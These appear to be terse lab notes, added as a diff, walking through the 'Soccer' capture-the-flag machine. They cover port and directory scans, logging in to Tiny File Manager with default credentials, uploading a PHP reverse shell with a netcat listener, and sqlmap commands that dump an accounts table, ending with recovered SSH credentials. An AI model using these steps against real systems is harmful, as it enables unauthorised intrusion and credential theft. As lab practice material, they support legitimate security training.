@@ -1,0 +1,44 @@
+We add soccer.htb to /etc/hosts
+
+nmap -p- -sC -sV $IP
+
+we have 3 ports open one ssh HTTP and 9091 is used for WebSockets
+
+
+ gobuster dir -u http://soccer.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-medium-2.3.txt
+ 
+ /tiny
+ 
+ 
+ tiny file manager
+ 
+ https://github.com/prasathmani/tinyfilemanager/wiki we check the configurations and find default credentials, we go ahead and use them on our site and they work
+ 
+ We can upload a PHP reverse-shell into the tiny/upload directory as we can only upload there
+ 
+ https://github.com/pentestmonkey/php-reverse-shell
+ 
+ After uploading access the shell code through the web browser also before that start a Netcat listener of the port specified in the reverse shell
+ 
+ 
+soc-player.soccer.htb
+
+we got a similar page here also but with login functionality.
+
+Sign up for an account
+
+After login, we can see that we have a ticket-checking system
+
+node.js
+
+https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html
+
+sqlmap -u “http://localhost:8081/?id="
+
+sqlmap -u “http://localhost:8081/?id=" --current-db
+
+sqlmap -u “http://localhost:8081/?id=" -D soccer_db --tables
+
+sqlmap -u "http://localhost:8081/?id=" -D soccer_db -T accounts --dump  
+
+player@player.htb PlayerOftheMatch2022 player ssh
